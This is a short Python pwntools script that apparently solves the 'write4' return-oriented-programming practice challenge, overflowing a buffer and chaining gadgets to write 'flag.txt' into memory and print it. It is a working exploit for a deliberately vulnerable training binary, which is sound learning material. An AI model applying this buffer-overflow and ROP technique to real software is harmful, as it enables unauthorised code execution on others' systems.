from pwn import *
binf = ELF("write4")
libc = "libwrite4.so"
#p = remote("chall.ctf.bamboofox.tw", 10102)
p=process('write4')

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(binf.path, gdbscript=gs)
    else:
        return process(binf.path)


context.log_level = "DEBUG"
#context.aslr = False
print(binf.plt)

GADGET_MOV = p64(0x400628) # mov qword ptr [r14], r15; ret;
GADGET_POP = p64(0x400690) # pop r14; pop r15; ret;
GADGET_POP_RDI= p64(0x400693)
SECTION_DATA = p64(0x601028)
PRINT_FLAG = p64(0x400620)

BINSH_STRING= b'flag.txt'


WRITE= GADGET_POP+SECTION_DATA+BINSH_STRING+GADGET_MOV

PAD=b'A'*40

p=start()

p.sendafter("> ", PAD+WRITE+GADGET_POP_RDI+SECTION_DATA+PRINT_FLAG)


p.interactive()
